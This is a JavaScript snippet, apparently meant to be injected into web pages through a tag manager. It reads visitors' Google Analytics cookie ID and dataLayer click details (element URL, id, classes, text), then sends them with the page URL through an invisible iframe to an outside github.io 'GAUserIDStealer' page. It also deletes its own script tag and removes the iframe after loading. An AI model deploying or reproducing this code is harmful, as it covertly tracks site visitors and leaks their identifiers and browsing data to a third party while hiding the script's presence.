function makeid(length) {
   var result           = '';
   var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
   var charactersLength = characters.length;
   for ( var i = 0; i < length; i++ ) {
      result += characters.charAt(Math.floor(Math.random() * charactersLength));
   }
   return result;
}

function getgaCid() {
    var name = "_ga=";
    var decodedCookie = decodeURIComponent(document.cookie);
    var ca = decodedCookie.split(';');
    for(var i = 0; i <ca.length; i++) {
        var c = ca[i];
            while (c.charAt(0) == ' ') {
                c = c.substring(1);
            }
            if (c.indexOf(name) == 0) {
                return c.substring(name.length+6, c.length);
            }
    }
    return "";
}

    
function removeScript(){
    var ss=document.getElementsByTagName('script');
    for(i=0;i<ss.length;i++){
        if(ss[i].innerHTML.indexOf("function getgaCid()")!==-1){
            ss[i].parentNode.removeChild(ss[i]);
            console.log("Remove script done ver4");
            break;
        }
    }
}

function doFlow(){
    var cilId=makeid(5);
    var ifrm_c = document.createElement('iframe');
    ifrm_c.setAttribute('id', cilId);
    ifrm_c.setAttribute('class', 'cil_steal');
    ifrm_c.style.display = "none";
    document.body.appendChild(ifrm_c);

    var cframe=document.getElementById(cilId);
    cframe.addEventListener("load",function(){
        setTimeout(function(){
            console.log("removing cil - "+cilId);
            cframe.parentNode.removeChild(cframe);
            console.log("remove cil - "+cilId+" done");
        }, 2500);
        
    });

    uuid=-1
    for(i=0;i<dataLayer.length;i++){
        try{
            uuid=dataLayer[i]['ga_c_id'];
        }
        catch(e){
            console.log("pass");
        }
        if(uuid!=null){
            break;
        }
    }
    element_url=-1
    for(i=dataLayer.length-1;i>0;i--){
        try{
            element_url=dataLayer[i]['gtm.elementUrl'];
        }
        catch(e){
            console.log("pass");
        }
        if(element_url!=null){
            break;
        }
    }
    elementClasses=-1
    for(i=dataLayer.length-1;i>0;i--){
        try{
            elementClasses=dataLayer[i]['gtm.elementClasses'];
        }
        catch(e){
            console.log("pass");
        }
        if(elementClasses!=null){
            break;
        }
    }
    elementId=-1
    for(i=dataLayer.length-1;i>0;i--){
        try{
            elementId=dataLayer[i]['gtm.elementId'];
        }
        catch(e){
            console.log("pass");
        }
        if(elementId!=null){
            break;
        }
    }
    elementText=-1
    for(i=dataLayer.length-1;i>0;i--){
        try{
            elementText=dataLayer[i]['gtm.element']["text"];
        }
        catch(e){
            console.log("pass");
        }
        if(elementText!=null){
            break;
        }
    }
    dataanalyticsID=-1
    for(i=dataLayer.length-1;i>0;i--){
        try{
            dataanalyticsID=dataLayer[i]['gtm.element'].dataset["analytics"];
        }
        catch(e){
            console.log("pass");
        }
        if(dataanalyticsID!=null){
            break;
        }
    }
        
    cframe.src ="https://guqima.github.io/GAUserIDStealer/steal.html?uid=="+uuid+"&&domain=="+window.location.hostname+"&&cid=="+getgaCid()+"&&url=="+window.location.href+"&&dataanalyticsID="+dataanalyticsID+"&&element_url=="+element_url+"&&elementClasses="+elementClasses+"&&elementId="+elementId+"&&elementText="+elementText;
}
